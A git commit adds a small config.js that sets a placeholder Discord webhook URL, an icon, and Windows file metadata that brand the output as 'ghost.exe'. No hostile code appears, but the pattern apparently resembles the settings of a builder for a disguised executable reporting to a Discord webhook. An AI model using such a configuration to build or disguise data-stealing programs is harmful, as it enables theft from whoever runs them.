57cfad5eb0338c0458004f7952b5a85aed94b063
mosec1 <59072041+mosec1@users.noreply.github.com>
2023-04-17 06:45:54 +0800

    Add files via upload

---
+++ config.js
@@ -0,0 +1,12 @@
+module.exports = () => {
+    return {
+        webhook_url: " your Discord api here",
+        icon: './default.ico',
+        properties: {
+            FileDescription: 'ghost',
+            ProductName: 'ghost',
+            LegalCopyright: 'ghost ©️ 2023',
+            OriginalFilename: 'ghost.exe'
+        }
+    }
+}
